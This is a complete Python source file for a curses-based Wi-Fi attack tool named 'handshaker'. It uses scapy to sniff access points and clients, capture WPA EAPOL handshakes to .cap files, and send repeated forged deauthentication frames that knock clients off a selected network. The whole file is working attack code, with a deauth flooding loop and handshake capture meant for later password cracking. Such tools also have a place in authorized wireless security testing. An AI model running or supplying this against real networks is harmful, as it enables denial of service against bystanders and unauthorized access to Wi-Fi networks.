#!/usr/bin/env python3

import argparse
import os
import threading
import time
import subprocess
import curses
from datetime import datetime
from scapy.all import *

# ====== Globals & State ======
networks = {}
logs = []
log_lock = threading.Lock()
cap_files = {}
stop_threads = False
persistent_eapol_captures = set()   # BSSIDs in lower-case
current_deauth_thread = [None]
filtered_bssid = [None]
current_channel_hopper_thread = [None]
channel_hopper_stop = [False]

def is_unicast(mac):
    try:
        if not mac or len(mac.split(':')) != 6:
            return False
        first_octet = int(mac.split(':')[0], 16)
        return (first_octet & 1) == 0
    except Exception:
        return False

def log(msg):
    with log_lock:
        ts = datetime.now().strftime('%H:%M:%S')
        logs.append(f'[{ts}] {msg}')
        if len(logs) > 500:
            logs.pop(0)

def channel_hopper(interface, user_channel=None):
    chs = [1,2,3,4,5,6,7,8,9,10,11]
    i = 0
    while not channel_hopper_stop[0]:
        if user_channel:
            ch = user_channel
        else:
            ch = chs[i % len(chs)]
            i += 1
        try:
            subprocess.run(['iwconfig', interface, 'channel', str(ch)],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            log(f'Switched to channel {ch}')
        except Exception as e:
            log(f'Error changing channel: {e}')
        time.sleep(2 if not user_channel else 5)
        if user_channel:
            break

def get_capfile(ssid, output_dir):
    if not output_dir:
        return None
    safe_ssid = ssid if ssid else 'unknown'
    fn = os.path.join(output_dir, f'{safe_ssid}_capture.cap')
    if fn not in cap_files:
        cap_files[fn] = PcapWriter(fn, append=True, sync=True)
    return cap_files[fn]

def cleanup_capfiles():
    for pcap in cap_files.values():
        try:
            pcap.close()
        except:
            pass

def parse_args():
    parser = argparse.ArgumentParser(
        description='Capture WPA handshakes and manage Wi-Fi clients (with optional deauth).'
    )
    parser.add_argument('-i', '--interface', required=True, help='Wireless interface in monitor mode')
    parser.add_argument('-c', '--channel', type=int, help='Channel to scan')
    parser.add_argument('-s', '--target-ssid', help='Filter by SSID')
    parser.add_argument('-b', '--target-bssid', help='Filter by BSSID')
    parser.add_argument('-t', '--timeout', type=int, default=60, help='Client timeout (seconds)')
    parser.add_argument('-d', '--deauth', action='store_true', help='Enable deauthentication')
    parser.add_argument('--interval', type=int, default=10, help='Deauth burst interval (seconds)')
    parser.add_argument('--output-directory', help='Directory for .cap files (no output if not set)')
    return parser.parse_args()

def process_packet(pkt, args, ui=None):
    if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
        bssid = pkt[Dot11].addr2
        ssid = '<hidden>'
        if pkt.haslayer(Dot11Elt):
            ssid = pkt[Dot11Elt].info.decode(errors='ignore')
        channel = None
        elt = pkt.getlayer(Dot11Elt)
        while elt is not None:
            if elt.ID == 3 and elt.info:
                channel = elt.info[0]
                break
            elt = elt.payload.getlayer(Dot11Elt)
        if args.target_ssid and ssid != args.target_ssid:
            return
        if args.target_bssid and bssid.lower() != args.target_bssid.lower():
            return
        if bssid not in networks:
            log(f'AP discovered: {ssid} ({bssid}) ch {channel}')
            networks[bssid] = {'ssid': ssid, 'channel': channel, 'clients': {}}
        else:
            networks[bssid]['ssid'] = ssid
            networks[bssid]['channel'] = channel

    if pkt.haslayer(Dot11):
        toDS = pkt[Dot11].FCfield & 0x1
        fromDS = pkt[Dot11].FCfield & 0x2
        addr1, addr2 = pkt[Dot11].addr1, pkt[Dot11].addr2
        bssid = client = None
        if fromDS and not toDS:
            bssid = addr2; client = addr1
        elif toDS and not fromDS:
            bssid = addr1; client = addr2
        else:
            return
        if not bssid or not client or not is_unicast(client):
            return
        if (args.target_ssid or args.target_bssid) and bssid not in networks:
            return
        if args.target_bssid and bssid.lower() != args.target_bssid.lower():
            return
        if bssid not in networks:
            networks[bssid] = {'ssid': '', 'channel': None, 'clients': {}}
        if client not in networks[bssid]['clients']:
            log(f'Client {client} seen on {bssid}')
        networks[bssid]['clients'][client] = time.time()

    # --- THIS is the new EAPOL marking logic: ---
    if pkt.haslayer(EAPOL):
        bssid = None
        if pkt[Dot11].addr2 in networks:
            bssid = pkt[Dot11].addr2
        elif pkt[Dot11].addr1 in networks:
            bssid = pkt[Dot11].addr1
        ssid = networks.get(bssid, {}).get('ssid', 'unknown')
        log(f'Handshake/EAPOL captured for SSID {ssid} ({bssid})')
        # Mark as having handshake on *any* EAPOL for this BSSID:
        if bssid:
            bssid_lc = bssid.lower()
            if bssid_lc not in persistent_eapol_captures:
                persistent_eapol_captures.add(bssid_lc)
                log(f'Marked {ssid} ({bssid}) as having EAPOL')
        if args.output_directory:
            capfile = get_capfile(ssid, args.output_directory)
            if capfile:
                capfile.write(pkt)
    if pkt.haslayer(Dot11):
        bssid = pkt[Dot11].addr2 if pkt[Dot11].addr2 in networks else pkt[Dot11].addr1
        ssid = networks.get(bssid, {}).get('ssid', None)
        if args.output_directory and ssid:
            capfile = get_capfile(ssid, args.output_directory)
            if capfile:
                capfile.write(pkt)

def deauth_worker(args):
    while not stop_threads:
        for bssid, ap in networks.items():
            if args.target_bssid and bssid.lower() != args.target_bssid.lower():
                continue
            for client in list(ap['clients']):
                if not is_unicast(client):
                    continue
                pkt = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
                sendp(pkt, iface=args.interface, count=5, inter=0.1, verbose=0)
                log(f'Deauth sent to {client} on {bssid}')
        time.sleep(args.interval)

def timeout_worker(timeout):
    while not stop_threads:
        now = time.time()
        for bssid, ap in networks.items():
            to_remove = [c for c, ts in ap['clients'].items() if now - ts > timeout]
            for c in to_remove:
                log(f'Removing inactive client {c} from {bssid}')
                del ap['clients'][c]
        time.sleep(5)

def sniffer_worker(args, ui=None):
    sniff(iface=args.interface,
          prn=lambda p: process_packet(p, args, ui),
          store=0, stop_filter=lambda x: stop_threads)

class NcursesUI:
    def __init__(self, args):
        self.args = args
        self.selected_ap_idx = 0
        self.ap_bssids = []
        self.log_scroll = 0
        self.running = True
        self.status_msg = ""
        self.prompt_active = False
        self.prompt_str = ""
        self.prompt_callback = None

    def draw(self, stdscr):
        stdscr.clear()
        maxy, maxx = stdscr.getmaxyx()

        if maxy < 6 or maxx < 40:
            try:
                stdscr.addstr(0, 0, "Terminal too small. Resize and restart.", curses.A_REVERSE)
            except curses.error:
                pass
            stdscr.refresh()
            return

        title = "handshaker — ↑↓=select AP  Enter=deauth  PgUp/PgDn=scroll log  q=quit"
        try:
            stdscr.addnstr(0, 0, title[:maxx].ljust(maxx), maxx, curses.A_REVERSE)
        except curses.error:
            pass

        panel_h = maxy//2 - 1
        row = 1
        aps = []
        self.ap_bssids = []
        if filtered_bssid[0] and filtered_bssid[0] in networks:
            bssid = filtered_bssid[0]
            ap = networks[bssid]
            ssid = ap.get('ssid', '<unknown>')
            ch = ap.get('channel', '?')
            aps.append((ssid, bssid, ch))
            self.ap_bssids.append(bssid)
        else:
            for bssid, ap in networks.items():
                ssid = ap.get('ssid', '<unknown>')
                ch = ap.get('channel', '?')
                aps.append((ssid, bssid, ch))
                self.ap_bssids.append(bssid)
        for i, (ssid, bssid, ch) in enumerate(aps):
            marker = " [EAPOL]" if bssid and bssid.lower() in persistent_eapol_captures else ""
            line = f"{'>' if i==self.selected_ap_idx else ' '} {ssid:20} {bssid:17} ch{ch}{marker}"
            attr = curses.A_BOLD | (curses.A_REVERSE if i==self.selected_ap_idx else 0)
            if row < panel_h:
                try:
                    stdscr.addnstr(row, 0, line[:maxx].ljust(maxx), maxx, attr)
                except curses.error:
                    pass
                row += 1
            if i==self.selected_ap_idx:
                cl = networks[bssid]['clients']
                for cli_mac in cl:
                    if row < panel_h:
                        try:
                            stdscr.addnstr(row, 2, f"↳ {cli_mac}"[:maxx-2].ljust(maxx-2), maxx-2)
                        except curses.error:
                            pass
                        row += 1
        log_start = panel_h
        if log_start < maxy:
            try:
                stdscr.hline(log_start, 0, "-", maxx)
            except curses.error:
                pass
        if log_start+1 < maxy:
            try:
                stdscr.addnstr(log_start+1, 0, "Event Log".ljust(maxx), maxx, curses.A_BOLD)
            except curses.error:
                pass
        with log_lock:
            view_logs = logs[-(panel_h-3+self.log_scroll):-self.log_scroll if self.log_scroll else None]
        for i, l in enumerate(view_logs or []):
            if log_start+2+i < maxy-1:
                try:
                    stdscr.addnstr(log_start+2+i, 0, l[:maxx].ljust(maxx), maxx)
                except curses.error:
                    pass
        if maxy > 1:
            if self.prompt_active:
                try:
                    stdscr.addnstr(maxy-1, 0, self.prompt_str[:maxx].ljust(maxx), maxx, curses.A_REVERSE)
                except curses.error:
                    pass
            elif self.status_msg:
                try:
                    stdscr.addnstr(maxy-1, 0, self.status_msg[:maxx].ljust(maxx), maxx, curses.A_REVERSE)
                except curses.error:
                    pass
        stdscr.refresh()

    def prompt(self, stdscr, msg, callback):
        self.prompt_active = True
        self.prompt_str = msg
        self.prompt_input = ""
        self.prompt_callback = callback

        while self.prompt_active:
            self.draw(stdscr)
            maxy, maxx = stdscr.getmaxyx()
            stdscr.timeout(100)
            ch = stdscr.getch()
            if ch == -1:
                continue
            if ch in (10, 13):
                self.prompt_active = False
                cb = self.prompt_callback
                self.prompt_callback = None
                if cb:
                    cb(self.prompt_input)
            elif ch in (27,):
                self.prompt_active = False
                self.prompt_str = ""
                self.prompt_input = ""
            elif ch in (curses.KEY_BACKSPACE, 127, 8):
                self.prompt_input = self.prompt_input[:-1]
            elif 32 <= ch < 128 and len(self.prompt_str) < maxx - 1:
                if len(msg + self.prompt_input) < maxx - 1:
                    self.prompt_input += chr(ch)
            self.prompt_str = msg + self.prompt_input

    def set_filters_and_deauth(self, ssid, bssid, channel, outdir):
        self.args.target_ssid = ssid
        self.args.target_bssid = bssid
        self.args.channel = channel
        self.args.output_directory = outdir
        self.args.deauth = True
        filtered_bssid[0] = bssid
        self.selected_ap_idx = 0
        log(f'Filters updated: SSID={ssid}, BSSID={bssid}, channel={channel}, output_dir={outdir}. Deauth started.')

        channel_hopper_stop[0] = True
        if current_channel_hopper_thread[0]:
            current_channel_hopper_thread[0].join(timeout=1)
            current_channel_hopper_thread[0] = None

        try:
            subprocess.run(['iwconfig', self.args.interface, 'channel', str(channel)],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            log(f"Switched interface {self.args.interface} to channel {channel} for selected AP.")
        except Exception as e:
            log(f"Failed to set channel: {e}")

        global stop_threads
        stop_threads = True
        if current_deauth_thread[0] and current_deauth_thread[0].is_alive():
            current_deauth_thread[0].join()
        stop_threads = False

        t_deauth = threading.Thread(target=deauth_worker, args=(self.args,), daemon=True)
        t_deauth.start()
        current_deauth_thread[0] = t_deauth

    def run(self, stdscr):
        curses.curs_set(0)
        stdscr.timeout(250)
        while self.running:
            self.draw(stdscr)
            ch = stdscr.getch()
            if ch == -1:
                continue
            if self.prompt_active:
                continue
            if ch in (ord('q'), ord('Q')):
                self.running = False
                break
            elif ch in (curses.KEY_UP, ord('k')):
                if self.selected_ap_idx > 0:
                    self.selected_ap_idx -= 1
            elif ch in (curses.KEY_DOWN, ord('j')):
                if self.selected_ap_idx < len(self.ap_bssids)-1:
                    self.selected_ap_idx += 1
            elif ch in (10, 13):
                if 0 <= self.selected_ap_idx < len(self.ap_bssids):
                    bssid = self.ap_bssids[self.selected_ap_idx]
                    ap = networks.get(bssid)
                    if ap:
                        ssid = ap.get('ssid', '<unknown>')
                        channel = ap.get('channel', 1)
                        def cb(outdir):
                            if outdir:
                                os.makedirs(outdir, exist_ok=True)
                                self.set_filters_and_deauth(ssid, bssid, channel, outdir)
                        self.prompt(stdscr, "Output directory: ", cb)
            elif ch == curses.KEY_PPAGE:
                self.log_scroll += 5
            elif ch == curses.KEY_NPAGE:
                self.log_scroll = max(0, self.log_scroll-5)
            else:
                self.log_scroll = 0

def main():
    args = parse_args()
    if args.output_directory:
        os.makedirs(args.output_directory, exist_ok=True)
    log(f'Handshaker started on {args.interface}')
    if args.channel:
        log(f'Scanning on channel {args.channel}')
    else:
        log('Channel hopping enabled')

    ui = NcursesUI(args)
    threads = []
    channel_hopper_stop[0] = False
    t_ch = threading.Thread(target=channel_hopper, args=(args.interface, args.channel), daemon=True)
    t_ch.start(); threads.append(t_ch)
    current_channel_hopper_thread[0] = t_ch
    t_to = threading.Thread(target=timeout_worker, args=(args.timeout,), daemon=True)
    t_to.start(); threads.append(t_to)
    t_sniff = threading.Thread(target=sniffer_worker, args=(args, ui), daemon=True)
    t_sniff.start(); threads.append(t_sniff)
    if args.deauth:
        t_deauth = threading.Thread(target=deauth_worker, args=(args,), daemon=True)
        t_deauth.start(); threads.append(t_deauth)

    try:
        curses.wrapper(ui.run)
    except KeyboardInterrupt:
        pass
    finally:
        global stop_threads
        stop_threads = True
        cleanup_capfiles()
        log('Exiting...')

if __name__ == '__main__':
    main()

